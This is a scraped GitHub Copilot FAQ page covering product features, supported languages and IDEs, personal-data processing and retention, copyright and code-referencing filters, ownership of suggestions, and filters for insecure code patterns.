GitHub Copilot includes filters to block offensive language in the prompts and to avoid synthesizing suggestions in sensitive contexts. We continue to work on improving the filter system to more intelligently detect and remove offensive outputs. If you see offensive outputs, please report them directly to copilot-safety@github.com so that we can improve our safeguards. GitHub takes this challenge very seriously and we are committed to addressing it.

#### Will GitHub Copilot work as well using languages other than English?

Given public sources are predominantly in English, GitHub Copilot will likely work less well in scenarios where natural language prompts provided by the developer are not in English and/or are grammatically incorrect. Therefore, non-English speakers might experience a lower quality of service.

#### What data has GitHub Copilot been trained on?

GitHub Copilot is powered by generative AI models developed by GitHub, OpenAI, and Microsoft. It has been trained on natural language text and source code from publicly available sources, including code in public repositories on GitHub.

1. Data from June 2023. Additional research can be found [here](https://github.blog/news-insights/research/the-economic-impact-of-the-ai-powered-developer-lifecycle-and-lessons-from-github-copilot/).
2. Feature in public beta for Copilot Pro and Business plans. Requires use of repositories, issues, discussions, Actions, and other features of GitHub.

GeneralPlans & PricingPrivacyResponsible AI
### General

#### What is GitHub Copilot?

GitHub Copilot transforms the developer experience. Backed by the leaders in AI, Copilot provides contextualized assistance throughout the software development lifecycle, from code completions and chat assistance in the IDE to code explanations and answers to docs in GitHub and more. With Copilot elevating their workflow, developers can focus on more: value, innovation, and happiness.

GitHub Copilot enables developers to focus more energy on problem solving and collaboration and spend less effort on the mundane and boilerplate. That’s why developers who use Copilot report up to 75% higher satisfaction with their jobs than those who don’t and are up to 55% more productive at writing code without sacrifice to quality, which all adds up to engaged developers shipping great software faster.

GitHub Copilot integrates with leading editors, including Visual Studio Code, Visual Studio, JetBrains IDEs, and Neovim, and, unlike other AI coding assistants, is natively built into GitHub. Growing to millions of individual users and tens of thousands of business customers, Copilot is the world’s most widely adopted AI developer tool and the competitive advantage developers ask for by name.

#### Who is eligible to access GitHub Copilot for free?

GitHub Copilot Free is a new free pricing tier with limited functionality for individual developers. Users assigned a Copilot Business or Copilot Enterprise seat are not eligible for access. Users with access to Copilot Pro through a paid subscription, trial, or through an existing verified OSS, Student, Faculty, or MVP account may elect to use Free instead.

#### What languages, IDEs, and platforms does GitHub Copilot support?

GitHub Copilot is trained on all languages that appear in public repositories. For each language, the quality of suggestions you receive may depend on the volume and diversity of training data for that language. For example, JavaScript is well-represented in public repositories and is one of GitHub Copilot’s best supported languages. Languages with less representation in public repositories may produce fewer or less robust suggestions.

GitHub Copilot is available as an extension in Visual Studio Code, Visual Studio, Vim, Neovim, the JetBrains suite of IDEs, and Azure Data Studio. Although code completion functionality is available across all these extensions, chat functionality is currently available only in Visual Studio Code, JetBrains and Visual Studio. GitHub Copilot is also supported in terminals through GitHub CLI and as a chat integration in Windows Terminal Canary. With the GitHub Copilot Enterprise plan, GitHub Copilot is natively integrated into GitHub.com. All plans are supported in GitHub Copilot in GitHub Mobile. GitHub Mobile for Copilot Pro and Copilot Business have access to Bing and public repository code search. Copilot Enterprise in GitHub Mobile gives you additional access to your organization's knowledge.

#### Does GitHub Copilot “copy/paste”?

No, GitHub Copilot generates suggestions using probabilistic determination.

* When thinking about intellectual property and open source issues, it is critical to understand how GitHub Copilot really works. The AI models that create Copilot’s suggestions may be trained on public code, but do not contain any code. When they generate a suggestion, they are not “copying and pasting” from any codebase.
* To generate a code suggestion, the Copilot extension begins by examining the code in your editor—focusing on the lines just before and after your cursor, but also information including other files open in your editor and the URLs of repositories or file paths to identify relevant context. That information is sent to Copilot’s model, to make a probabilistic determination of what is likely to come next and generate suggestions.
* To generate a suggestion for chat in the code editor, the Copilot extension creates a contextual prompt by combining your prompt with additional context including the code file open in your active document, your code selection, and general workspace information, such as frameworks, languages, and dependencies. That information is sent to Copilot’s model, to make a probabilistic determination of what is likely to come next and generate suggestions.
* To generate a suggestion for chat on GitHub.com, such as providing an answer to a question from your chat prompt, Copilot creates a contextual prompt by combining your prompt with additional context including previous prompts, the open pages on GitHub.com as well as retrieved context from your codebase or Bing search. That information is sent to Copilot’s model, to make a probabilistic determination of what is likely to come next and generate suggestions.

#### What are the differences between the GitHub Copilot Business, GitHub Copilot Enterprise, and GitHub Copilot Individual plans?

### Privacy

#### What personal data does GitHub Copilot process?

GitHub Copilot processes personal data based on how Copilot is accessed and used: whether via GitHub.com, mobile app, extensions, or one of various IDE extensions, or through features like suggestions for the command line interface (CLI), IDE code completions, or personalized chat on GitHub.com. The types of personal data processed may include:

* **User Engagement Data:** This includes pseudonymous identifiers captured on user interactions with Copilot, such as accepted or dismissed completions, error messages, system logs, and product usage metrics.
* **Prompts:** These are inputs for chat or code, along with context, sent to Copilot's AI to generate suggestions.
* **Suggestions:** These are the AI-generated code lines or chat responses provided to users based on their prompts.
* **Feedback Data:** This comprises real-time user feedback, including reactions (e.g., thumbs up/down) and optional comments, along with feedback from support tickets.

#### Does GitHub use Copilot Business or Enterprise data to train GitHub’s model?

No. GitHub does not use either Copilot Business or Enterprise data to train its models.

#### How does GitHub use the Copilot data?

How GitHub uses Copilot data depends on how the user accesses Copilot and for what purpose. Users can access GitHub Copilot through the web, extensions, mobile apps, computer terminal, and various IDEs (Integrated Development Environments). GitHub generally uses personal data to:

* Deliver, maintain, and update the services as per the customer's configuration and usage, to ensure personalized experiences and recommendations
* Troubleshoot, which involves preventing, detecting, resolving, and mitigating issues, including security incidents and product-related problems, by fixing software bugs and maintaining the online services' functionality and up-to-dateness
* Enhance user productivity, reliability, effectiveness, quality, privacy, accessibility, and security by keeping the service current and operational

These practices are outlined in GitHub’s Data Protection Agreement ([DPA)](https://github.com/customer-terms/github-data-protection-agreement), which details our data handling commitments to our data controller customers.

GitHub also uses certain personal data with customer authorization under the DPA, for the following purposes:

* Billing and account management
* To comply with and resolve legal obligations
* For abuse detection, prevention, and protection, virus scanning, and scanning to detect violations of terms of service
* To generate summary reports for calculating employee commissions and partner incentives
* To produce aggregated reports for internal use and strategic planning, covering areas like forecasting, revenue analysis, capacity planning, and product strategy,

For details on GitHub's data processing activities as a controller, particularly for Copilot Pro customers, refer to the [GitHub Privacy Statement](https://docs.github.com/en/site-policy/privacy-policies/github-general-privacy-statement).

#### How long does GitHub retain Copilot data for Business and Enterprise customers?

If and for how long GitHub’s retains Copilot data depends on how a Copilot user accesses Copilot and for what purpose. The default settings for Copilot Business and Enterprise Customers are as follows:

**Access through IDE for Chat and Code Completions:**

* Prompts and Suggestions: Not retained
* User Engagement Data: Kept for two years.
* Feedback Data: Stored for as long as needed for its intended purpose.

**All other GitHub Copilot access and use:**

* Prompts and Suggestions: Retained for 28 days.
* User Engagement Data: Kept for two years.
* Feedback Data: Stored for as long as needed for its intended purpose.

#### Why do some Copilot features retain prompts and suggestions?

Retaining prompts and suggestions is necessary for chat on github.com, mobile, and CLI Copilot because those features’ effectiveness depends on using thread history to improve responses. The Copilot model requires access to previous interactions to deliver accurate and relevant suggestions.

#### Does GitHub Copilot support compliance with the GDPR and other data protection laws?

Yes. GitHub and customers can enter a [Data Protection Agreement](https://github.com/customer-terms/github-data-protection-agreement) that supports compliance with the GDPR and similar legislation.

#### Does GitHub Copilot ever output personal data?

While we've designed GitHub Copilot with privacy in mind, the expansive definition of personal data under legislation like the EU’s General Data Protection Regulation (GDPR) means we can't guarantee it will never output such data. The Large Language Model (LLM) powering GitHub Copilot was trained on public code and there were instances in our tests where the tool made suggestions resembling personal data. These suggestions were typically synthesized and not tied to real individuals.

#### How does Copilot allow users to access, alter or delete personal data?

These actions are available to Copilot users as described in the [GitHub Privacy Statement](https://docs.github.com/en/site-policy/privacy-policies/github-general-privacy-statement#your-privacy-rights).

### Responsible AI

#### What are the intellectual property considerations when using GitHub Copilot?

The primary IP considerations for GitHub Copilot relate to copyright. The model that powers Copilot is trained on a broad collection of publicly accessible code, which may include copyrighted code, and Copilot’s suggestions (in rare instances) may resemble the code its model was trained on. Here’s some basic information you should know about these considerations:

Copyright law permits the use of copyrighted works to train AI models:  Countries around the world have provisions in their copyright laws that enable machines to learn, understand, extract patterns, and facts from copyrighted materials, including software code. For example, the European Union, Japan, and Singapore, have express provisions permitting machine learning to develop AI models. Other countries including Canada, India, and the United States also permit such training under their fair use/fair dealing provisions. GitHub Copilot’s AI model was trained with the use of code from GitHub’s public repositories—which are publicly accessible and within the scope of permissible copyright use.

What about copyright risk in suggestions? In rare instances (less than 1% based on GitHub’s research), suggestions from GitHub may match examples of code used to train GitHub’s AI model. Again, Copilot does not “look up” or “copy and paste” code, but is instead using context from a user’s workspace to synthesize and generate a suggestion.

Our experience shows that matching suggestions are most likely to occur in two situations: (i) when there is little or no context in the code editor for Copilot’s model to synthesize, or (ii) when a matching suggestion represents a common approach or method. If a code suggestion matches existing code, there is risk that using that suggestion could trigger claims of copyright infringement, which would depend on the amount and nature of code used, and the context of how the code is used. In many ways, this is the same risk that arises when using any code that a developer does not originate, such as copying code from an online source, or reusing code from a library. That is why responsible organizations and developers recommend that users employ code scanning policies to identify and evaluate potential matching code.

In Copilot, you can opt whether to allow Copilot to suggest code completions that match publicly available code on GitHub.com. For more information, see "[Configuring GitHub Copilot settings on GitHub.com](https://docs-internal-46619-d1aa34.preview.ghdocs.com/en/copilot/configuring-github-copilot/configuring-github-copilot-settings-on-githubcom#enabling-or-disabling-duplication-detection)". If you have allowed suggestions that match public code, GitHub Copilot can provide you with details about the matching code when you accept such suggestions. Matching code does not necessarily mean copyright infringement, so it is ultimately up to the user to determine whether to use the suggestion, and what and who to attribute (along with other license compliance) in appropriate circumstances.

#### Does GitHub Copilot include a filtering mechanism to mitigate risk?

Yes, GitHub Copilot does include an optional code referencing filter to detect and suppress certain suggestions that match public code on GitHub.

* GitHub has created a duplication detection filter to detect and suppress suggestions that contain code segments over a certain length that match public code on GitHub. This filter can be enabled by the administrator for your enterprise and it can apply for all organizations within your enterprise, or the administrator can defer control to individual organizations.
* With the filter enabled, Copilot checks code suggestions for matches or near-matches against public code on GitHub of 65 lexemes or more (on average,150 characters). If there is a match, the suggestion will not be shown to the user.
* In addition to off-topic, harmful, and offensive output filters, GitHub Copilot also scans the outputs for vulnerable code.

#### Does GitHub Copilot include features to make it easier for users to identify potentially relevant open source licenses for matching suggestions?

Yes, GitHub Copilot is previewing a [code referencing feature](https://github.blog/2023-08-03-introducing-code-referencing-for-github-copilot/) as an additional tool to assist users to find and review potentially relevant open source licenses. Code referencing is currently available in Visual Studio Code. This feature searches across public GitHub repositories for code that matches a Copilot suggestion. If there’s a match, users will find its information displayed in the Copilot console log, including where the match occurred, any applicable licenses, and a deep link to learn more. The deep link will take users to a navigable page on GitHub.com to browse examples of the code match and their repository licenses, and see how many repositories—including ones without licenses—that code appears in, as well as links to those repositories. Copilot users can review this information to determine whether the applicable suggestions are suitable for use, and whether additional measures may be necessary to use them.

#### Who owns the suggestions provided by GitHub Copilot?

We don’t determine whether a suggestion is capable of being owned, but we are clear that GitHub does not claim ownership of a suggestion. Whether a suggestion generated by an AI model can be owned depends on many factors (e.g. the intellectual property law in the relevant country, the length of the suggestion, the extent that suggestion is considered ‘functional’ instead of expressive, etc).

* If a suggestion is capable of being owned, our terms are clear: GitHub does not claim ownership.
* GitHub does not claim ownership of any suggestion. In certain cases, it is possible for Copilot to produce similar suggestions to different users. For example, two unrelated users both starting new files to code the quicksort algorithm in Java will likely get the same suggestion. The possibility of providing similar suggestions to multiple users is a common part of generative AI systems.

#### Can GitHub Copilot introduce insecure code in its suggestions?

Public code may contain insecure coding patterns, bugs, or references to outdated APIs or idioms. When GitHub Copilot synthesizes code suggestions based on this data, it can also synthesize code that contains these undesirable patterns. Copilot has filters in place that either block or notify users of insecure code patterns that are detected in Copilot suggestions. These filters target the most common vulnerable coding patterns, including [hardcoded credentials](https://cwe.mitre.org/data/definitions/798.html), [SQL injections](https://cwe.mitre.org/data/definitions/89.html), and [path injections](https://cwe.mitre.org/data/definitions/22.html). Additionally, in recent years we’ve provided tools such as GitHub Advanced Security, GitHub Actions, Dependabot, and CodeQL to open source projects to help improve code quality. Of course, you should always use GitHub Copilot together with good testing and code review practices and security tools, as well as your own judgment.
